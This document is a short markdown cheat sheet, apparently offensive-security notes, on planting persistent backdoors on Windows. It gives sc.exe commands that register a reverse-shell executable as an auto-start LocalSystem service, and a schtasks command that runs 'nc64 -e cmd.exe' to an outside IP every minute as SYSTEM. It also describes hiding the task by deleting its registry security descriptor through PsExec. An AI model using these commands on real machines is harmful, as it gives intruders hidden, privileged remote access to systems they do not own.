# Backdoor Services

Create a new service that loads a reverse shell.

Note: Spaces are neccessary after the `=`
```sh
sc.exe create MyServiceName binpath= "C:\shell.exe" start= auto
sc.exe start MyServiceName
```

Modify Service
```sh
sc.exe config MyServiceName binPath= "C:\shell.exe" start=auto obj= "LocalSystem"
```

Check Configuration
```sh
sc.exe  query state=all
sc.exe qc MyService
```

## Scheduled Tasks

Task Scheduler:
[MS Docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
`sc` - schedule type (hour, minute)
`mo` - Modifiers 24, 60, 365
`ru` - User account which the task runs under

```sh
schtasks /create /sc minute /mo 1 /tn MyBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.10.10 4449" /ru SYSTEM
```

If a user isn't allowed to query a scheduled task it will not be visible. We can make our task invisible to everyone by removing the *Security Descriptor (SD)* 

System privileges are required to erase an SD. All task SD are located at: 
```sh
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Open up the registry editor:
```sh
C:\tools\pstools\PsExec64.exe -s -i regedit
```
